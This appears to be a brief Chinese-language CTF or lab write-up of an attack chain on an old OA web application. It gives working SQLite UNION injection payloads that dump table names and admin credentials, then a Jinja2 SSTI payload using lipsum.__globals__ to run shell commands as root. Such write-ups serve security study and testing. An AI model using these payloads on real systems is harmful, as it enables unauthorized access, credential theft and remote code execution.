# 老旧OA系统渗透链：搜索框SQL注入提取管理员凭据 → 管理后台Jinja2 SSTI → RCE。SQLite UNION注入枚举sqlite_master获取表结构，Flask应用使用lipsum.__globals__绕过常见SSTI沙箱限制。

## 攻击链

### 阶段一：SQL注入提取凭据
老旧OA系统（2008年协同办公系统）在公告搜索功能存在SQLite UNION注入：
- 参数：`/dashboard?search_query=`
- 确认列数：ORDER BY 4 正常，5 报错 → 4列
- 枚举表：`UNION SELECT name,null,null,null FROM sqlite_master` → users, notices
- 提取凭据：`UNION SELECT id,password,null,null FROM users` → admin/admin_C0mplex_P@ss!99

### 阶段二：SSTI → RCE
管理员后台 `/admin` 的模板渲染功能（notice_html_blob参数）直接拼接用户输入到Jinja2模板中：
- 确认：`{{7*7}}` → 49
- 引擎：Flask Jinja2（`{{config}}` 返回Flask Config对象）
- RCE payload：`{{lipsum.__globals__['os'].popen('cmd').read()}}`
- 权限：root（容器环境）

### 关键技巧
1. 当 `__class__.__mro__` 链被过滤时，`lipsum` 是Jinja2内置全局函数，其 `__globals__` 可直接访问 `os` 模块
2. SQLite 用 `sqlite_master` 替代 `information_schema` 枚举表结构
3. UNION注入时注意原查询列数和回显位置，确保数据出现在可见列
